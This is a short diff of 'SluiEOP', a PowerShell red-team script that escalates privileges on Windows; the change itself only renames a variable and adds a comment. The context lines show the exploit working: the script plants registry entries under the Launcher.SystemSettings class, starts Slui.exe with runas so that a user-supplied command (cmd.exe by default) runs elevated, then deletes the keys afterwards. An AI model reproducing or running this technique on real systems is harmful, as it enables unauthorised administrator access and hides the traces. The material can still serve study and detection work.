@@ -48,7 +48,7 @@
 
 
 $Command = $Null
-$DetailedDataDump = $False
+$DetailedInfo = $False
 $param1 = $args[0] # User Inputs [<arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -68,7 +68,7 @@ If($CheckVuln -eq $True){
       Write-Host "SluiEOP v1.6 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
       # Output Detailed Info on screen
-      $DetailedDataDump = $True
+      $DetailedInfo = $True
    }
 
    ### Add Entrys to Regedit { using powershell }
@@ -93,7 +93,7 @@ If($CheckVuln -eq $True){
    ### Start the vulnerable Process { using powershell }
    Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
-   Start-Sleep -Milliseconds 2700
+   Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
    ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
@@ -115,7 +115,7 @@ If($CheckVuln -eq $True){
       AMD64        notepad      5543
    #>
 
-   If($DetailedDataDump -eq $True){
+   If($DetailedInfo -eq $True){
       If($Command -match ' ' -and $Command -match 'cmd'){
          ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
          $ParsingData = $Command -Split(' ')
